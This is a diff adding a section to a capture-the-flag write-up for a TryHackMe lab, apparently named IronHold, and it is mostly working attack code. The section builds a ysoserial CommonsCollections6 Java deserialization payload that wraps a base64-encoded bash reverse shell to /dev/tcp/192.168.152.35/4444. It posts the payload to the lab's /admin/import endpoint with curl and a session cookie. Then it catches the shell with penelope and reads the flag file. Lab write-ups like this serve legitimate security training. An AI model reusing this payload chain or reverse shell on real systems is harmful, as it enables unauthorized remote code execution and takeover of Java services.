@@ -377,3 +377,119 @@ fullName=Shift+Kiosk+Account&email=kiosk%40ironhold.example&badgeNumber=K-000&ro
 > /admin/control panel after privilege escalation:
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-12-43.png)
+
+
+---
+
+## RCE: Java Deserialization
+
+> Now that we can access `/admin/import` and `/admin/export`, and also know that there is a vulnerable dependency to Java Deserialization, we can achieve RCE. In the `/export` endpoint, I saw a serialized output, so we will have to somehow post a serialized RCE payload. I used `ysoserial` for this.
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-41-29.png)
+
+```shell
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# git clone https://github.com/frohoff/ysoserial.git
+Cloning into 'ysoserial'...
+remote: Enumerating objects: 2306, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (5/5), done.
+remote: Total 2306 (delta 5), reused 3 (delta 3), pack-reused 2298 (from 2)
+Receiving objects: 100% (2306/2306), 463.63 KiB | 1.06 MiB/s, done.
+Resolving deltas: 100% (1114/1114), done.
+
+
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─# echo '/bin/bash -i >& /dev/tcp/192.168.152.35/4444 0>&1' | base64                                                                                                                                                                   
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─# ls
+appveyor.yml  assembly.xml  DISCLAIMER.txt  Dockerfile  LICENSE.txt  payload.b64  payload.bin  pom.xml  README.md  src  ysoserial-all.jar  ysoserial.png
+                                                                                                                                                                   
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─#  base64 -w 0 payload.bin > payload.b64
+
+curl -X POST "http://iron.thm:8080/admin/import" \
+  -H "Cookie: JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4" \
+  -H "Content-Type: text/plain" \
+  --data-binary "@payload.b64"
+Batch accepted: HashSet                                                                                                                                                                                                                    
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─# echo '/bin/bash -i >& /dev/tcp/192.168.152.35/4444 0>&1' | base64
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=
+                                                                                                                                                                                                                    
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─# payload=$(java --add-opens=java.base/java.util=ALL-UNNAMED \
+  -jar ysoserial-all.jar CommonsCollections6 \
+  "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64 -w0)
+                                                                                                                                                                                                                    
+┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
+└─# curl -b 'JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' \     
+  -H 'Content-Type: text/plain' \             
+  http://iron.thm:8080/admin/import \                                                                                      
+  -d $payload
+Batch accepted: HashSet
+```
+
+> Tab 2: Reverse Shell - penelope
+
+> Looks like we succeeded! The serialized payload was executed successfully.
+
+```bash
+┌──(root㉿kali)-[~]
+└─# penelope -p 4444
+[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 172.16.112.128 • 172.17.0.1 • 192.168.152.35
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => f62a3262ffed 10.130.153.100 Linux-x86_64 👤 appuser(1000) 😍️ Session ID <1>
+[-] Cannot deploy agent with remote Python. Select an action below:
+
+  1) Upload https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz                                         
+  2) Upload local Standalone Python binary                                                                                                                                                                          
+  3) Specify remote Standalone Python binary path                                                                                                                                                                   
+  4) None of the above
+
+                                             
+[?] Select action: 1
+[•] ⤓ Downloading URL: https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz
+ ⤷ [########################################] 100% (26.4 MBytes/26.4 MBytes) | 6.0 MBytes/s | Elapsed 0:00:03
+[•] ⇥ Uploading to /var/tmp
+ ⤷ [########################################] 100% (35.0 MBytes/35.0 MBytes) | 100.0 KBytes/s | Elapsed 0:06:18
+[+] Uploaded /var/tmp/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz
+
+[-] Cannot deploy agent...
+[+] Readline support enabled
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /root/.penelope/sessions/f62a3262ffed~10.130.153.100-Linux-x86_64/2026_07_29-18_11_09-538-appuser(1000).log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+appuser@f62a3262ffed:/app$ ls
+ls
+app.jar
+docker-entrypoint.sh
+appuser@f62a3262ffed:/app$ 
+
+```
+
+## Local Enumeration & Final Flag
+
+```shell
+appuser@f62a3262ffed:/app$ find / -name "*flag*" 2>/dev/null
+find / -name "*flag*" 2>/dev/null
+/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/virtual/net/eth0/flags
+/sys/module/scsi_mod/parameters/default_dev_flags
+/proc/sys/kernel/acpi_video_flags
+/proc/sys/net/ipv4/fib_notify_on_flag_change
+/proc/sys/net/ipv6/fib_notify_on_flag_change
+/proc/kpageflags
+/opt/ironhold/flag.txt
+appuser@f62a3262ffed:/app$ cat /opt/ironhold/flag.txt
+cat /opt/ironhold/flag.txt
+THM{redacted}
+appuser@f62a3262ffed:/app$ 
+```
+
+
+And we finished this CTF!  
